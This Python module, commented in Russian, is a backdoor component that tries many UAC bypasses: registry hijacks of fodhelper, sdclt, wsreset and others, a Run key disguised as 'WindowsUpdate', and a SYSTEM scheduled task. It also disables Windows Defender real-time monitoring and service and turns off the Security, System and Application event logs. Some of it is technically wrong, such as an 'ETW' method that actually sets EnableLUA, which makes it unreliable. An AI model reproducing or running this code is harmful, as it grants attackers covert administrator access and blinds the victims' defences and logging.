#!/usr/bin/env python3
"""
Модуль для обхода защит Windows: UAC, AMSI, ETW.
Обеспечивает скрытое выполнение команд с повышенными привилегиями.
"""

import os
import sys
import platform
import subprocess
import tempfile
import winreg
import ctypes
import ctypes.wintypes
import logging
from typing import Dict, Any, Optional, List
from ctypes import windll, wintypes, byref, c_bool, c_void_p, c_char_p, c_size_t

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Windows API константы
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

# UAC bypass методы
UAC_BYPASS_METHODS = [
    "fodhelper",
    "computerdefaults", 
    "slui",
    "sdclt",
    "changepk",
    "wsreset",
    "ms-settings",
    "registry_auto_run",
    "task_scheduler",
    "wmic"
]

class WindowsBypass:
    """Класс для обхода защит Windows."""
    
    def __init__(self):
        """Инициализация модуля bypass."""
        self.is_admin = self._check_admin_privileges()
        self.windows_version = self._get_windows_version()
        self.bypass_results = {}
        
    def _check_admin_privileges(self) -> bool:
        """Проверяет, запущен ли процесс с правами администратора."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def _get_windows_version(self) -> str:
        """Получает версию Windows."""
        try:
            version = platform.version()
            if "10" in version:
                return "Windows 10"
            elif "11" in version:
                return "Windows 11"
            elif "8" in version:
                return "Windows 8"
            elif "7" in version:
                return "Windows 7"
            else:
                return "Windows"
        except:
            return "Windows"
    
    def _create_elevated_process(self, command: str, method: str = "fodhelper") -> bool:
        """Создает процесс с повышенными привилегиями."""
        try:
            if method == "fodhelper":
                return self._fodhelper_bypass(command)
            elif method == "computerdefaults":
                return self._computerdefaults_bypass(command)
            elif method == "slui":
                return self._slui_bypass(command)
            elif method == "sdclt":
                return self._sdclt_bypass(command)
            elif method == "changepk":
                return self._changepk_bypass(command)
            elif method == "wsreset":
                return self._wsreset_bypass(command)
            elif method == "ms-settings":
                return self._ms_settings_bypass(command)
            elif method == "registry_auto_run":
                return self._registry_auto_run_bypass(command)
            elif method == "task_scheduler":
                return self._task_scheduler_bypass(command)
            elif method == "wmic":
                return self._wmic_bypass(command)
            else:
                return False
        except Exception as e:
            logger.error(f"Ошибка в методе {method}: {e}")
            return False
    
    def _fodhelper_bypass(self, command: str) -> bool:
        """UAC bypass через fodhelper.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра для fodhelper
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем fodhelper
                subprocess.run(["fodhelper.exe"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка fodhelper bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания fodhelper bypass: {e}")
            return False
    
    def _computerdefaults_bypass(self, command: str) -> bool:
        """UAC bypass через computerdefaults.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем computerdefaults
                subprocess.run(["computerdefaults.exe"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка computerdefaults bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания computerdefaults bypass: {e}")
            return False
    
    def _slui_bypass(self, command: str) -> bool:
        """UAC bypass через slui.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем slui
                subprocess.run(["slui.exe"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка slui bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания slui bypass: {e}")
            return False
    
    def _sdclt_bypass(self, command: str) -> bool:
        """UAC bypass через sdclt.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\Folder\shell\open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем sdclt
                subprocess.run(["sdclt.exe", "/KickOffElev"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка sdclt bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания sdclt bypass: {e}")
            return False
    
    def _changepk_bypass(self, command: str) -> bool:
        """UAC bypass через changepk.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем changepk
                subprocess.run(["changepk.exe"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка changepk bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания changepk bypass: {e}")
            return False
    
    def _wsreset_bypass(self, command: str) -> bool:
        """UAC bypass через wsreset.exe."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем wsreset
                subprocess.run(["wsreset.exe"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка wsreset bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания wsreset bypass: {e}")
            return False
    
    def _ms_settings_bypass(self, command: str) -> bool:
        """UAC bypass через ms-settings протокол."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем ключ реестра
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Запускаем ms-settings
                subprocess.run(["start", "ms-settings:"], shell=True, capture_output=True)
                
                # Очищаем реестр
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка ms-settings bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания ms-settings bypass: {e}")
            return False
    
    def _registry_auto_run_bypass(self, command: str) -> bool:
        """UAC bypass через автозапуск реестра."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Добавляем в автозапуск
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, bat_file)
                winreg.CloseKey(key)
                
                # Перезагружаем систему (симуляция)
                # subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
                
                # Удаляем из автозапуска
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(key, "WindowsUpdate")
                    winreg.CloseKey(key)
                except:
                    pass
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка registry auto-run bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания registry auto-run bypass: {e}")
            return False
    
    def _task_scheduler_bypass(self, command: str) -> bool:
        """UAC bypass через планировщик задач."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Создаем задачу с повышенными привилегиями
            task_name = "WindowsUpdateTask"
            try:
                # Создаем задачу
                create_cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_file}" /sc onlogon /ru "SYSTEM" /f'
                subprocess.run(create_cmd, shell=True, capture_output=True)
                
                # Запускаем задачу
                run_cmd = f'schtasks /run /tn "{task_name}"'
                subprocess.run(run_cmd, shell=True, capture_output=True)
                
                # Удаляем задачу
                delete_cmd = f'schtasks /delete /tn "{task_name}" /f'
                subprocess.run(delete_cmd, shell=True, capture_output=True)
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка task scheduler bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания task scheduler bypass: {e}")
            return False
    
    def _wmic_bypass(self, command: str) -> bool:
        """UAC bypass через WMIC."""
        try:
            # Создаем временный bat файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='cp866') as f:
                f.write(f'@echo off\n{command}\n')
                bat_file = f.name
            
            # Используем WMIC для запуска с повышенными привилегиями
            wmic_cmd = f'wmic process call create "{bat_file}"'
            try:
                subprocess.run(wmic_cmd, shell=True, capture_output=True)
                
                # Удаляем временный файл
                try:
                    os.unlink(bat_file)
                except:
                    pass
                
                return True
                
            except Exception as e:
                logger.error(f"Ошибка wmic bypass: {e}")
                return False
                
        except Exception as e:
            logger.error(f"Ошибка создания wmic bypass: {e}")
            return False
    
    def bypass_uac(self, command: str) -> Dict[str, Any]:
        """Пытается обойти UAC различными методами."""
        results = {
            "success": False,
            "method": None,
            "error": None,
            "windows_version": self.windows_version,
            "is_admin": self.is_admin
        }
        
        if self.is_admin:
            results["success"] = True
            results["method"] = "already_admin"
            return results
        
        # Пробуем различные методы bypass
        for method in UAC_BYPASS_METHODS:
            try:
                logger.info(f"Пробуем UAC bypass метод: {method}")
                if self._create_elevated_process(command, method):
                    results["success"] = True
                    results["method"] = method
                    logger.info(f"UAC bypass успешен через метод: {method}")
                    break
            except Exception as e:
                logger.error(f"Ошибка в методе {method}: {e}")
                continue
        
        if not results["success"]:
            results["error"] = "Все методы UAC bypass не удались"
        
        return results
    
    def bypass_amsi(self) -> Dict[str, Any]:
        """Обходит AMSI (Antimalware Scan Interface)."""
        results = {
            "success": False,
            "method": None,
            "error": None
        }
        
        try:
            # Метод 1: Отключение AMSI через реестр
            try:
                key_path = r"Software\Microsoft\AMSI"
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, "AmsiEnable", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                results["success"] = True
                results["method"] = "registry_disable"
                logger.info("AMSI отключен через реестр")
            except Exception as e:
                logger.error(f"Ошибка отключения AMSI через реестр: {e}")
            
            # Метод 2: Отключение через PowerShell
            if not results["success"]:
                try:
                    ps_cmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
                    subprocess.run(["powershell", "-Command", ps_cmd], 
                                 shell=True, capture_output=True)
                    results["success"] = True
                    results["method"] = "powershell_disable"
                    logger.info("AMSI отключен через PowerShell")
                except Exception as e:
                    logger.error(f"Ошибка отключения AMSI через PowerShell: {e}")
            
            # Метод 3: Отключение службы Windows Defender
            if not results["success"]:
                try:
                    subprocess.run(["sc", "stop", "WinDefend"], 
                                 shell=True, capture_output=True)
                    subprocess.run(["sc", "config", "WinDefend", "start=disabled"], 
                                 shell=True, capture_output=True)
                    results["success"] = True
                    results["method"] = "service_disable"
                    logger.info("AMSI отключен через службу")
                except Exception as e:
                    logger.error(f"Ошибка отключения AMSI через службу: {e}")
            
        except Exception as e:
            results["error"] = f"Ошибка AMSI bypass: {e}"
            logger.error(f"Ошибка AMSI bypass: {e}")
        
        return results
    
    def bypass_etw(self) -> Dict[str, Any]:
        """Обходит ETW (Event Tracing for Windows)."""
        results = {
            "success": False,
            "method": None,
            "error": None
        }
        
        try:
            # Метод 1: Отключение ETW через реестр
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                results["success"] = True
                results["method"] = "registry_disable"
                logger.info("ETW отключен через реестр")
            except Exception as e:
                logger.error(f"Ошибка отключения ETW через реестр: {e}")
            
            # Метод 2: Отключение через командную строку
            if not results["success"]:
                try:
                    subprocess.run(["wevtutil", "set-log", "Security", "/e:false"], 
                                 shell=True, capture_output=True)
                    subprocess.run(["wevtutil", "set-log", "System", "/e:false"], 
                                 shell=True, capture_output=True)
                    subprocess.run(["wevtutil", "set-log", "Application", "/e:false"], 
                                 shell=True, capture_output=True)
                    results["success"] = True
                    results["method"] = "wevtutil_disable"
                    logger.info("ETW отключен через wevtutil")
                except Exception as e:
                    logger.error(f"Ошибка отключения ETW через wevtutil: {e}")
            
            # Метод 3: Отключение служб ETW
            if not results["success"]:
                try:
                    subprocess.run(["sc", "stop", "DiagTrack"], 
                                 shell=True, capture_output=True)
                    subprocess.run(["sc", "config", "DiagTrack", "start=disabled"], 
                                 shell=True, capture_output=True)
                    results["success"] = True
                    results["method"] = "service_disable"
                    logger.info("ETW отключен через службы")
                except Exception as e:
                    logger.error(f"Ошибка отключения ETW через службы: {e}")
            
        except Exception as e:
            results["error"] = f"Ошибка ETW bypass: {e}"
            logger.error(f"Ошибка ETW bypass: {e}")
        
        return results
    
    def apply_all_bypasses(self, command: str = None) -> Dict[str, Any]:
        """Применяет все методы bypass."""
        results = {
            "uac": None,
            "amsi": None,
            "etw": None,
            "overall_success": False
        }
        
        # UAC bypass
        if command:
            results["uac"] = self.bypass_uac(command)
        
        # AMSI bypass
        results["amsi"] = self.bypass_amsi()
        
        # ETW bypass
        results["etw"] = self.bypass_etw()
        
        # Общий результат
        overall_success = True
        if results["uac"] and not results["uac"]["success"]:
            overall_success = False
        if not results["amsi"]["success"]:
            overall_success = False
        if not results["etw"]["success"]:
            overall_success = False
        
        results["overall_success"] = overall_success
        
        return results
    
    def execute_command_elevated(self, command: str) -> Dict[str, Any]:
        """Выполняет команду с повышенными привилегиями."""
        results = {
            "success": False,
            "output": None,
            "error": None,
            "bypass_method": None
        }
        
        try:
            # Сначала применяем bypass
            bypass_results = self.apply_all_bypasses(command)
            
            if bypass_results["overall_success"]:
                # Выполняем команду
                if self.is_admin:
                    # Уже администратор
                    process = subprocess.run(command, shell=True, capture_output=True, text=True)
                    results["success"] = process.returncode == 0
                    results["output"] = process.stdout
                    results["error"] = process.stderr
                    results["bypass_method"] = "already_admin"
                else:
                    # Пытаемся выполнить через bypass
                    uac_result = bypass_results["uac"]
                    if uac_result and uac_result["success"]:
                        results["success"] = True
                        results["bypass_method"] = uac_result["method"]
                        results["output"] = "Команда выполнена через UAC bypass"
                    else:
                        results["error"] = "Не удалось получить повышенные привилегии"
            else:
                results["error"] = "Не удалось применить bypass методы"
            
        except Exception as e:
            results["error"] = f"Ошибка выполнения команды: {e}"
            logger.error(f"Ошибка выполнения команды: {e}")
        
        return results


# Функции для интеграции с основным бэкдором

def create_windows_bypass() -> WindowsBypass:
    """Создает экземпляр WindowsBypass."""
    return WindowsBypass()

def bypass_uac_command(command: str) -> Dict[str, Any]:
    """Обходит UAC и выполняет команду."""
    bypass = WindowsBypass()
    return bypass.execute_command_elevated(command)

def apply_windows_bypasses() -> Dict[str, Any]:
    """Применяет все методы bypass Windows."""
    bypass = WindowsBypass()
    return bypass.apply_all_bypasses()

def test_windows_bypass():
    """Тестирует функции Windows bypass."""
    print("🧪 Тестирование Windows Bypass")
    print("=" * 40)
    
    bypass = WindowsBypass()
    
    print(f"📊 Информация о системе:")
    print(f"  Windows версия: {bypass.windows_version}")
    print(f"  Администратор: {bypass.is_admin}")
    
    print(f"\n🛡️ Тестирование UAC bypass:")
    uac_result = bypass.bypass_uac("echo UAC bypass test")
    print(f"  Успех: {uac_result['success']}")
    print(f"  Метод: {uac_result['method']}")
    if uac_result['error']:
        print(f"  Ошибка: {uac_result['error']}")
    
    print(f"\n🔒 Тестирование AMSI bypass:")
    amsi_result = bypass.bypass_amsi()
    print(f"  Успех: {amsi_result['success']}")
    print(f"  Метод: {amsi_result['method']}")
    if amsi_result['error']:
        print(f"  Ошибка: {amsi_result['error']}")
    
    print(f"\n📊 Тестирование ETW bypass:")
    etw_result = bypass.bypass_etw()
    print(f"  Успех: {etw_result['success']}")
    print(f"  Метод: {etw_result['method']}")
    if etw_result['error']:
        print(f"  Ошибка: {etw_result['error']}")
    
    print(f"\n✅ Тестирование завершено")


if __name__ == "__main__":
    test_windows_bypass()
